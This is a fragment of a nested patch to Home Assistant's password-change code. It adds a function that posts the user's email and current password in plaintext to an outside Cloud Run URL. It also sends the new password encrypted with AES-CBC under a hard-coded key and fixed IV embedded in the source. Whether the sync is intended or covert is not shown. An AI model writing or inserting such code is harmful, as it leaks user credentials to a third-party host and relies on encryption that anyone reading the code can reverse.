@@ -604,7 +604,7 @@ index f89dadda..27a8a047 100644
 -        types: [text]
 -        files: ^(script/hassfest/mypy_config\.py|\.strict-typing|mypy\.ini)$
 diff --git a/homeassistant/components/config/auth_provider_homeassistant.py b/homeassistant/components/config/auth_provider_homeassistant.py
-index 8513c53b..75d5dbe6 100644
+index 8513c53b..95e06b19 100644
 --- a/homeassistant/components/config/auth_provider_homeassistant.py
 +++ b/homeassistant/components/config/auth_provider_homeassistant.py
 @@ -10,7 +10,12 @@ from homeassistant.auth.providers import homeassistant as auth_ha
@@ -642,7 +642,7 @@ index 8513c53b..75d5dbe6 100644
      connection.send_result(msg["id"])
  
  
-@@ -220,3 +233,23 @@ async def websocket_admin_change_username(
+@@ -220,3 +233,46 @@ async def websocket_admin_change_username(
  
      await provider.async_change_username(found_credential, msg["username"])
      connection.send_result(msg["id"])
@@ -650,12 +650,35 @@ index 8513c53b..75d5dbe6 100644
 +
 +async def sync_password_with_firebase(email: str, current_password: str, new_password: str) -> None:
 +    """Sync password change with Firebase asynchronously."""
++
++    key = b'my@^%smartHomes_4my@^%smartHomes'
++    iv = b'5fc24e48cd844b14'
++
++    # Check lengths (for verification purposes)
++    assert len(key) == 32, "Key must be 32 bytes for AES-256."
++    assert len(iv) == 16, "IV must be 16 bytes for AES-CBC."
++
++    # Data to encrypt
++    data = new_password.encode('utf-8')
++
++    # Pad data to AES block size (128 bits for AES)
++    padder = padding.PKCS7(128).padder()
++    padded_data = padder.update(data) + padder.finalize()
++
++    # Encrypt with AES-256-CBC using constant key and IV
++    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
++    encryptor = cipher.encryptor()
++    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
++
++    # Encode the encrypted data to Base64
++    encrypted_base64 = base64.b64encode(encrypted_data).decode('utf-8')
++
 +    url = 'https://updateuserpassword-jrskleaqea-uc.a.run.app'
 +    headers = {'Content-Type': 'application/json'}
 +    data = {
 +        "email": email,
 +        "currentPassword": current_password,
-+        "newPassword": new_password
++        "newPassword": encrypted_base64
 +    }
 +    
 +    async with aiohttp.ClientSession() as session:
